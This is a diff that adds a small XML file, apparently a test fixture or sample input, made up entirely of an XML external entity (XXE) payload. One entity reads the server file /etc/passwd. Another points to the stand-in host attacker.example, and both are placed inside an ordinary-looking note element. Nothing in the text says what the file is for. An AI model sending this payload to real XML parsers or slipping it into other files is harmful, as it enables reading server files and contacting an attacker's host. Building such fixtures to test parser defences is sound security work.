@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE note [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "http://attacker.example/collect">
+]>
+<note><to>&secret;</to><from>&remote;</from><img src="pictures/a.png"/></note>
